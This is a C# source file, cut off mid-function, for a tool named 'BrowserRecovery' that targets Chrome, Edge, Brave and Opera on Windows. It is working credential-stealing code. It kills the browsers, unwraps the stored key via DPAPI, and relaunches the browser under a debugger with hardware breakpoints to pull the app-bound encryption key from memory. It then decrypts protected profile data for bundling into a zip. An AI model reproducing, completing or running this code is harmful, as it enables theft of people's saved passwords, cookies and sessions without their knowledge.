using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Diagnostics;

namespace ConsoleApp1
{
    internal class BrowserRecovery
    {
        private class BrowserConfig
        {
            public string Name { get; set; }
            public string ProcessName { get; set; }
            public string[] ExePaths { get; set; }
            public string DllName { get; set; }
            public string[] UserDataSubdir { get; set; }
            public string OutputDir { get; set; }
            public string TempPrefix { get; set; }
            public bool UseR14 { get; set; }
            public bool UseRoaming { get; set; }
            public bool HasAbe { get; set; }
        }

        private static readonly List<BrowserConfig> Configs = new List<BrowserConfig>
        {
            new BrowserConfig
            {
                Name = "Google Chrome",
                ProcessName = "chrome.exe",
                ExePaths = new[]
                {
                    @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
                },
                DllName = "chrome.dll",
                UserDataSubdir = new[] { "Google", "Chrome", "User Data" },
                OutputDir = "chrome",
                TempPrefix = "chrome_tmp",
                UseR14 = false,
                UseRoaming = false,
                HasAbe = true
            },
            new BrowserConfig
            {
                Name = "Microsoft Edge",
                ProcessName = "msedge.exe",
                ExePaths = new[]
                {
                    @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                    @"C:\Program Files\Microsoft\Edge\Application\msedge.exe"
                },
                DllName = "msedge.dll",
                UserDataSubdir = new[] { "Microsoft", "Edge", "User Data" },
                OutputDir = "edge",
                TempPrefix = "edge_tmp",
                UseR14 = true,
                UseRoaming = false,
                HasAbe = true
            },
            new BrowserConfig
            {
                Name = "Brave",
                ProcessName = "brave.exe",
                ExePaths = new[]
                {
                    @"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
                    @"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe"
                },
                DllName = "brave.dll",
                UserDataSubdir = new[] { "BraveSoftware", "Brave-Browser", "User Data" },
                OutputDir = "brave",
                TempPrefix = "brave_tmp",
                UseR14 = false,
                UseRoaming = false,
                HasAbe = true
            },
            new BrowserConfig
            {
                Name = "Opera Stable",
                ProcessName = "opera.exe",
                ExePaths = new[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera\opera.exe"),
                    @"C:\Program Files\Opera\launcher.exe",
                    @"C:\Program Files (x86)\Opera\launcher.exe"
                },
                DllName = "launcher_lib.dll",
                UserDataSubdir = new[] { "Opera Software", "Opera Stable" },
                OutputDir = "opera",
                TempPrefix = "opera_tmp",
                UseR14 = false,
                UseRoaming = true,
                HasAbe = false
            },
            new BrowserConfig
            {
                Name = "Opera GX",
                ProcessName = "opera.exe",
                ExePaths = new[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Opera GX\opera.exe"),
                    @"C:\Program Files\Opera GX\launcher.exe",
                    @"C:\Program Files (x86)\Opera GX\launcher.exe"
                },
                DllName = "launcher_lib.dll",
                UserDataSubdir = new[] { "Opera Software", "Opera GX Stable" },
                OutputDir = "operagx",
                TempPrefix = "operagx_tmp",
                UseR14 = false,
                UseRoaming = true,
                HasAbe = false
            }
        };

        #region Win32 P/Invoke

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DEBUG_EVENT
        {
            [FieldOffset(0)]
            public uint dwDebugEventCode;
            [FieldOffset(4)]
            public uint dwProcessId;
            [FieldOffset(8)]
            public uint dwThreadId;
            [FieldOffset(16)] // Alignment padding for x64
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 160)]
            public byte[] u;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LOAD_DLL_DEBUG_INFO
        {
            public IntPtr hFile;
            public IntPtr lpBaseOfDll;
            public uint dwDebugInfoFileOffset;
            public uint nDebugInfoSize;
            public IntPtr lpImageName;
            public ushort fUnicode;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_DEBUG_INFO
        {
            public EXCEPTION_RECORD ExceptionRecord;
            public uint dwFirstChance;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecordPtr;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
            public IntPtr[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong Low;
            public long High;
        }

        [StructLayout(LayoutKind.Explicit, Size = 1232)]
        public struct CONTEXT64
        {
            [FieldOffset(0x30)] public uint ContextFlags;
            [FieldOffset(0x34)] public uint MxCsr;
            [FieldOffset(0x38)] public ushort SegCs;
            [FieldOffset(0x3A)] public ushort SegDs;
            [FieldOffset(0x3C)] public ushort SegEs;
            [FieldOffset(0x3E)] public ushort SegFs;
            [FieldOffset(0x40)] public ushort SegGs;
            [FieldOffset(0x42)] public ushort SegSs;
            [FieldOffset(0x44)] public uint EFlags;
            [FieldOffset(0x48)] public ulong Dr0;
            [FieldOffset(0x50)] public ulong Dr1;
            [FieldOffset(0x58)] public ulong Dr2;
            [FieldOffset(0x60)] public ulong Dr3;
            [FieldOffset(0x68)] public ulong Dr6;
            [FieldOffset(0x70)] public ulong Dr7;
            [FieldOffset(0x78)] public ulong Rax;
            [FieldOffset(0x80)] public ulong Rcx;
            [FieldOffset(0x88)] public ulong Rdx;
            [FieldOffset(0x90)] public ulong Rbx;
            [FieldOffset(0x98)] public ulong Rsp;
            [FieldOffset(0xA0)] public ulong Rbp;
            [FieldOffset(0xA8)] public ulong Rsi;
            [FieldOffset(0xB0)] public ulong Rdi;
            [FieldOffset(0xB8)] public ulong R8;
            [FieldOffset(0xC0)] public ulong R9;
            [FieldOffset(0xC8)] public ulong R10;
            [FieldOffset(0xD0)] public ulong R11;
            [FieldOffset(0xD8)] public ulong R12;
            [FieldOffset(0xE0)] public ulong R13;
            [FieldOffset(0xE8)] public ulong R14;
            [FieldOffset(0xF0)] public ulong R15;
            [FieldOffset(0xF8)] public ulong Rip;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ContinueDebugEvent(uint dwProcessId, uint dwThreadId, uint dwContinueStatus);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern uint GetFinalPathNameByHandle(IntPtr hFile, [Out] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

        public const uint DEBUG_ONLY_THIS_PROCESS = 0x00000002;
        public const uint CREATE_NEW_CONSOLE = 0x00000010;
        public const uint INFINITE = 0xFFFFFFFF;
        public const uint DBG_CONTINUE = 0x00010002;
        public const uint DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const uint LOAD_DLL_DEBUG_EVENT = 6;
        public const uint EXCEPTION_DEBUG_EVENT = 1;
        public const uint CREATE_THREAD_DEBUG_EVENT = 2;
        public const uint EXIT_PROCESS_DEBUG_EVENT = 5;
        public const uint EXCEPTION_SINGLE_STEP = 0x80000004;

        public const uint PROCESS_TERMINATE = 0x0001;
        public const uint THREAD_GET_CONTEXT = 0x0008;
        public const uint THREAD_SET_CONTEXT = 0x0010;
        public const uint THREAD_SUSPEND_RESUME = 0x0002;

        public const uint CONTEXT_AMD64 = 0x00100000;
        public const uint CONTEXT_CONTROL = CONTEXT_AMD64 | 0x00000001;
        public const uint CONTEXT_INTEGER = CONTEXT_AMD64 | 0x00000002;
        public const uint CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x00000010;
        public const uint CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS;

        [StructLayout(LayoutKind.Sequential)]
        public struct CRYPT_INTEGER_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CryptUnprotectData(
            ref CRYPT_INTEGER_BLOB pDataIn,
            IntPtr ppszDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            out CRYPT_INTEGER_BLOB pDataOut);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CryptStringToBinary(
            string pszString,
            uint cchString,
            uint dwFlags,
            byte[] pbBinary,
            ref uint pcbBinary,
            IntPtr pdwSkip,
            IntPtr pdwFlags);

        public const uint CRYPT_STRING_BASE64 = 0x00000001;

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptDecrypt(
            IntPtr hKey,
            byte[] pbInput,
            uint cbInput,
            ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
            byte[] pbIV,
            uint cbIV,
            byte[] pbOutput,
            uint cbOutput,
            out uint pcbResult,
            uint dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public uint cbSize;
            public uint dwInfoVersion;
            public IntPtr pbNonce;
            public uint cbNonce;
            public IntPtr pbAuthData;
            public uint cbAuthData;
            public IntPtr pbTag;
            public uint cbTag;
            public IntPtr pbMacContext;
            public uint cbMacContext;
            public uint cbAAD;
            public ulong cbData;
            public uint dwFlags;
        }

        public const string BCRYPT_AES_ALGORITHM = "AES";
        public const string BCRYPT_CHAINING_MODE = "ChainingMode";
        public const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
        public const uint BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION = 1;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_open(string filename, out IntPtr db);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_close(IntPtr db);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_step(IntPtr stmt);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_column_int(IntPtr stmt, int index);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern long sqlite3_column_int64(IntPtr stmt, int index);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr sqlite3_column_text(IntPtr stmt, int index);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern IntPtr sqlite3_column_blob(IntPtr stmt, int index);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_column_bytes(IntPtr stmt, int index);

        [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
        public static extern int sqlite3_finalize(IntPtr stmt);

        public const int SQLITE_OK = 0;
        public const int SQLITE_ROW = 100;
        public const int SQLITE_DONE = 101;

        #endregion

        public static void Execute(string zipPath)
        {
            foreach (var config in Configs)
            {
                try
                {
                    ProcessBrowser(config, zipPath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error processing {config.Name}: {ex.Message}");
                }
            }
        }

        private static void ProcessBrowser(BrowserConfig config, string zipPath)
        {
            string userDataDir = GetUserDataDir(config.UserDataSubdir, config.UseRoaming);
            if (string.IsNullOrEmpty(userDataDir) || !Directory.Exists(userDataDir))
                return;

            string exePath = config.ExePaths.FirstOrDefault(File.Exists);
            if (string.IsNullOrEmpty(exePath))
                return;

            KillProcessesByName(config.ProcessName);
            if (config.ProcessName != "launcher.exe" && config.Name.Contains("Opera"))
                KillProcessesByName("launcher.exe");

            byte[] masterKey = GetV10Key(userDataDir, out bool isDpapi);
            bool shouldDebug = config.HasAbe;

            if (masterKey != null)
            {
                if (isDpapi && !config.HasAbe)
                {
                    ExtractAllProfilesData(null, masterKey, config, userDataDir, zipPath);
                    shouldDebug = false;
                }
                else if (!isDpapi && !config.HasAbe)
                {
                    ExtractAllProfilesData(masterKey, null, config, userDataDir, zipPath);
                    shouldDebug = false;
                }
            }

            if (shouldDebug)
            {
                STARTUPINFO si = new STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                string cmdLine = $"\"{exePath}\" --no-first-run --no-default-browser-check";

                if (CreateProcess(null, cmdLine, IntPtr.Zero, IntPtr.Zero, false, DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi))
                {
                    DebugLoop(pi.hProcess, config, userDataDir, zipPath);
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }
        }

        private static void DebugLoop(IntPtr hProcess, BrowserConfig config, string userDataDir, string zipPath)
        {
            DEBUG_EVENT debugEvent = new DEBUG_EVENT();
            IntPtr targetAddress = IntPtr.Zero;

            while (WaitForDebugEvent(out debugEvent, INFINITE))
            {
                if (debugEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT)
                {
                    LOAD_DLL_DEBUG_INFO loadDll = PtrToStructure<LOAD_DLL_DEBUG_INFO>(debugEvent.u);
                    StringBuilder sb = new StringBuilder(260);
                    if (GetFinalPathNameByHandle(loadDll.hFile, sb, (uint)sb.Capacity, 0) > 0)
                    {
                        string path = sb.ToString();
                        if (path.IndexOf(config.DllName, StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            targetAddress = FindTargetAddress(hProcess, loadDll.lpBaseOfDll);
                            if (targetAddress != IntPtr.Zero)
                            {
                                foreach (uint tid in GetProcessThreads(debugEvent.dwProcessId))
                                {
                                    SetHardwareBreakpoint(tid, targetAddress);
                                }
                            }
                        }
                    }
                }
                else if (debugEvent.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT)
                {
                    if (targetAddress != IntPtr.Zero)
                    {
                        SetHardwareBreakpoint(debugEvent.dwThreadId, targetAddress);
                    }
                }
                else if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
                {
                    EXCEPTION_DEBUG_INFO exception = PtrToStructure<EXCEPTION_DEBUG_INFO>(debugEvent.u);
                    if (exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP)
                    {
                        if (exception.ExceptionRecord.ExceptionAddress == targetAddress)
                        {
                            if (ExtractKeyFromThread(debugEvent.dwThreadId, hProcess, config, userDataDir, zipPath))
                            {
                                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                                return;
                            }
                        }
                        SetResumeFlag(debugEvent.dwThreadId);
                    }
                }
                else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
                {
                    return;
                }

                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
            }
        }

        private static T PtrToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            try
            {
                return Marshal.PtrToStructure<T>(handle.AddrOfPinnedObject());
            }
            finally
            {
                handle.Free();
            }
        }

        private static IntPtr FindTargetAddress(IntPtr hProcess, IntPtr baseAddr)
        {
            byte[] dosHeader = new byte[64];
            if (!ReadProcessMemory(hProcess, baseAddr, dosHeader, (uint)dosHeader.Length, out _)) return IntPtr.Zero;
            int lfanew = BitConverter.ToInt32(dosHeader, 60);

            byte[] ntHeaders = new byte[264];
            if (!ReadProcessMemory(hProcess, (IntPtr)((long)baseAddr + lfanew), ntHeaders, (uint)ntHeaders.Length, out _)) return IntPtr.Zero;

            ushort numSections = BitConverter.ToUInt16(ntHeaders, 6);
            int sizeOfOptionalHeader = BitConverter.ToUInt16(ntHeaders, 20);
            IntPtr sectionHeaderAddr = (IntPtr)((long)baseAddr + lfanew + 4 + 20 + sizeOfOptionalHeader);

            byte[] sectionHeaders = new byte[numSections * 40];
            if (!ReadProcessMemory(hProcess, sectionHeaderAddr, sectionHeaders, (uint)sectionHeaders.Length, out _)) return IntPtr.Zero;

            string targetString = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
            byte[] targetBytes = Encoding.ASCII.GetBytes(targetString);
            IntPtr stringVa = IntPtr.Zero;

            for (int i = 0; i < numSections; i++)
            {
                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
                if (name == ".rdata")
                {
                    uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                    uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
                    byte[] data = new byte[virtualSize];
                    if (ReadProcessMemory(hProcess, (IntPtr)((long)baseAddr + virtualAddress), data, virtualSize, out _))
                    {
                        int pos = FindSubsequence(data, targetBytes);
                        if (pos != -1)
                        {
                            stringVa = (IntPtr)((long)baseAddr + virtualAddress + pos);
                            break;
                        }
                    }
                }
            }

            if (stringVa == IntPtr.Zero) return IntPtr.Zero;

            for (int i = 0; i < numSections; i++)
            {
                string name = Encoding.ASCII.GetString(sectionHeaders, i * 40, 8).Split('\0')[0];
                if (name == ".text")
                {
                    uint virtualSize = BitConverter.ToUInt32(sectionHeaders, i * 40 + 8);
                    uint virtualAddress = BitConverter.ToUInt32(sectionHeaders, i * 40 + 12);
                    byte[] data = new byte[virtualSize];
                    if (ReadProcessMemory(hProcess, (IntPtr)((long)baseAddr + virtualAddress), data, virtualSize, out _))
                    {
                        for (int pos = 0; pos < data.Length - 7; pos++)
                        {
                            if (data[pos] == 0x48 && data[pos + 1] == 0x8D && data[pos + 2] == 0x0D)
                            {
                                int offset = BitConverter.ToInt32(data, pos + 3);
                                IntPtr rip = (IntPtr)((long)baseAddr + virtualAddress + pos + 7);
                                IntPtr target = (IntPtr)((long)rip + offset);
                                if (target == stringVa) return (IntPtr)((long)baseAddr + virtualAddress + pos);
                            }
                        }
                    }
                }
            }
            return IntPtr.Zero;
        }

        private static int FindSubsequence(byte[] haystack, byte[] needle)
        {
            for (int i = 0; i <= haystack.Length - needle.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < needle.Length; j++)
                {
                    if (haystack[i + j] != needle[j]) { found = false; break; }
                }
                if (found) return i;
            }
            return -1;
        }

        private static IEnumerable<uint> GetProcessThreads(uint pid)
        {
            foreach (ProcessThread thread in Process.GetProcessById((int)pid).Threads)
                yield return (uint)thread.Id;
        }

        private static void SetHardwareBreakpoint(uint tid, IntPtr address)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, tid);
            if (hThread != IntPtr.Zero)
            {
                SuspendThread(hThread);
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                if (GetThreadContext(hThread, ref ctx))
                {
                    ctx.Dr0 = (ulong)address;
                    ctx.Dr7 = (ctx.Dr7 & ~3UL) | 1UL;
                    SetThreadContext(hThread, ref ctx);
                }
                ResumeThread(hThread);
                CloseHandle(hThread);
            }
        }

        private static void SetResumeFlag(uint tid)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, tid);
            if (hThread != IntPtr.Zero)
            {
                SuspendThread(hThread);
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = CONTEXT_CONTROL;
                if (GetThreadContext(hThread, ref ctx))
                {
                    ctx.EFlags |= 0x10000;
                    SetThreadContext(hThread, ref ctx);
                }
                ResumeThread(hThread);
                CloseHandle(hThread);
            }
        }

        private static bool ExtractKeyFromThread(uint tid, IntPtr hProcess, BrowserConfig config, string userDataDir, string zipPath)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT, false, tid);
            if (hThread == IntPtr.Zero) return false;

            bool success = false;
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(hThread, ref ctx))
            {
                ulong[] ptrs = config.UseR14 ? new[] { ctx.R14, ctx.R15 } : new[] { ctx.R15, ctx.R14 };
                foreach (ulong ptr in ptrs)
                {
                    if (ptr == 0) continue;
                    byte[] buffer = new byte[32];
                    if (ReadProcessMemory(hProcess, (IntPtr)ptr, buffer, (uint)buffer.Length, out _))
                    {
                        // Chromium stores its key in a std::string like structure
                        // [data_ptr (8b)][length (8b)][capacity (8b)]
                        // If length is <= 15, data might be stored inline (SSO), but for 32-byte keys it's always on heap.
                        ulong dataPtr = BitConverter.ToUInt64(buffer, 0);
                        ulong length = BitConverter.ToUInt64(buffer, 8);

                        if (length == 32)
                        {
                            byte[] key = new byte[32];
                            if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, (uint)key.Length, out _))
                            {
                                if (key.Any(b => b != 0))
                                {
                                    ExtractAllProfilesData(key, null, config, userDataDir, zipPath);
                                    success = true;
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            CloseHandle(hThread);
            return success;
        }

        private static string GetUserDataDir(string[] subdirs, bool useRoaming)
        {
            string baseDir = useRoaming ? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string path = Path.Combine(baseDir, Path.Combine(subdirs));
            return Directory.Exists(path) ? path : null;
        }

        private static void KillProcessesByName(string name)
        {
            foreach (var p in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name)))
            {
                try { p.Kill(); p.WaitForExit(3000); } catch { }
            }
        }

        private static byte[] GetV10Key(string userDataDir, out bool isDpapi)
        {
            isDpapi = false;
            try
            {
                string localStatePath = Path.Combine(userDataDir, "Local State");
                if (!File.Exists(localStatePath)) return null;
                string content = File.ReadAllText(localStatePath);
                int keyIdx = content.IndexOf("\"encrypted_key\":\"");
                if (keyIdx == -1) return null;
                int start = keyIdx + "\"encrypted_key\":\"".Length;
                int end = content.IndexOf("\"", start);
                string encryptedKeyB64 = content.Substring(start, end - start);

                uint pcbBinary = 0;
                CryptStringToBinary(encryptedKeyB64, (uint)encryptedKeyB64.Length, CRYPT_STRING_BASE64, null, ref pcbBinary, IntPtr.Zero, IntPtr.Zero);
                byte[] encryptedKey = new byte[pcbBinary];
                CryptStringToBinary(encryptedKeyB64, (uint)encryptedKeyB64.Length, CRYPT_STRING_BASE64, encryptedKey, ref pcbBinary, IntPtr.Zero, IntPtr.Zero);

                byte[] encryptedBlob;
                if (Encoding.ASCII.GetString(encryptedKey, 0, 5) == "DPAPI")
                {
                    isDpapi = true;
                    encryptedBlob = new byte[encryptedKey.Length - 5];
                    Array.Copy(encryptedKey, 5, encryptedBlob, 0, encryptedBlob.Length);
                }
                else
                {
                    encryptedBlob = encryptedKey;
                }

                CRYPT_INTEGER_BLOB input = new CRYPT_INTEGER_BLOB { cbData = (uint)encryptedBlob.Length, pbData = Marshal.AllocHGlobal(encryptedBlob.Length) };
                Marshal.Copy(encryptedBlob, 0, input.pbData, encryptedBlob.Length);
                if (CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out CRYPT_INTEGER_BLOB output))
                {
                    byte[] key = new byte[output.cbData];
                    Marshal.Copy(output.pbData, key, 0, key.Length);
                    LocalFree(output.pbData);
                    Marshal.FreeHGlobal(input.pbData);
                    return key;
                }
                Marshal.FreeHGlobal(input.pbData);
            }
            catch { }
            return null;
        }

        private static byte[] DecryptBlob(byte[] blob, byte[] v10Key, byte[] v20Key, bool isOpera)
        {
            if (blob == null || blob.Length < 15) return null;

            string prefix = Encoding.ASCII.GetString(blob, 0, 3);
            byte[] key = null;

            if (prefix == "v10" || prefix == "v20")
            {
                key = (prefix == "v20") ? v20Key : v10Key;
                if (key == null) key = (prefix == "v20") ? v10Key : v20Key; // Fallback
                if (key == null) return null;

                byte[] nonce = new byte[12];
                Array.Copy(blob, 3, nonce, 0, 12);
                byte[] ciphertext = new byte[blob.Length - 15 - 16];
                Array.Copy(blob, 15, ciphertext, 0, ciphertext.Length);
                byte[] tag = new byte[16];
                Array.Copy(blob, blob.Length - 16, tag, 0, 16);

                byte[] decrypted = AesGcmDecrypt(key, nonce, ciphertext, tag);
                if (decrypted != null)
                {
                    if ((prefix == "v20" || isOpera) && decrypted.Length > 32)
                    {
                        byte[] result = new byte[decrypted.Length - 32];
                        Array.Copy(decrypted, 32, result, 0, result.Length);
                        return result;
                    }
                    return decrypted;
                }
            }
            else
            {
                // DPAPI fallback
                CRYPT_INTEGER_BLOB input = new CRYPT_INTEGER_BLOB { cbData = (uint)blob.Length, pbData = Marshal.AllocHGlobal(blob.Length) };
                Marshal.Copy(blob, 0, input.pbData, blob.Length);
                if (CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out CRYPT_INTEGER_BLOB output))
                {
                    byte[] dec = new byte[output.cbData];
                    Marshal.Copy(output.pbData, dec, 0, dec.Length);
                    LocalFree(output.pbData);
                    Marshal.FreeHGlobal(input.pbData);
                    return dec;
                }
                Marshal.FreeHGlobal(input.pbData);
            }
            return null;
        }

        private static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
        {
            IntPtr hAlg = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;
            IntPtr pbNonce = IntPtr.Zero;
            IntPtr pbTag = IntPtr.Zero;

            try
            {
                if (BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0) != 0) return null;
                byte[] chainMode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM + "\0");
                if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, (uint)chainMode.Length, 0) != 0) return null;
                if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0) != 0) return null;

                pbNonce = Marshal.AllocHGlobal(nonce.Length);
                Marshal.Copy(nonce, 0, pbNonce, nonce.Length);
                pbTag = Marshal.AllocHGlobal(tag.Length);
                Marshal.Copy(tag, 0, pbTag, tag.Length);

